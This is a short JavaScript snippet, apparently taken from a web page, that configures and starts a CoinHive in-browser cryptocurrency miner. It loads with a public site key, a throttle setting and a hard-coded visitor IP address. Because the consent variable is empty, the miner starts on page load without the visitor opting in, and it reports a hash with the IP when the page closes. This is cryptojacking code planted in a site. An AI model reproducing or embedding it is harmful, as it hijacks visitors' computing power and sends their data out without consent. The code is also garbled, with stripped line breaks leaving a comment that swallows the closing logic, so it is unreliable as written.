var mobileStatus = "true";
var chPublicKey = "rkZDb4ovUsfw0AdcpRubOSl2fignwpwN";
var chUserConcent = "";
var chMinerSpeed = "0.1";
var chDelayedMinerSpeed = "0.1";
var chDelayedMinerTime = "0";
var chUserip = "80.0.215.188";
var miner = new CoinHive.Anonymous(chPublicKey, {
    throttle: chMinerSpeed
});
var username = "unknown";
if (miner.isMobile() && mobileStatus == false) { // do nothing}else{if (chUserConcent == "on" && miner.didOptOut(86400)){// do nothing}else{miner.start();if (chDelayedMinerTime > 0 && chDelayedMinerSpeed > 0){chDelayedMinerTime = chDelayedMinerTime * 60000;setTimeout(function(){cm_delayedMiner(miner, chDelayedMinerSpeed)}, chDelayedMinerTime);}window.addEventListener("beforeunload", function (e) {console.log("beforeunload?");cm_sendHash(miner, chUserip, username, "coinhive");});}}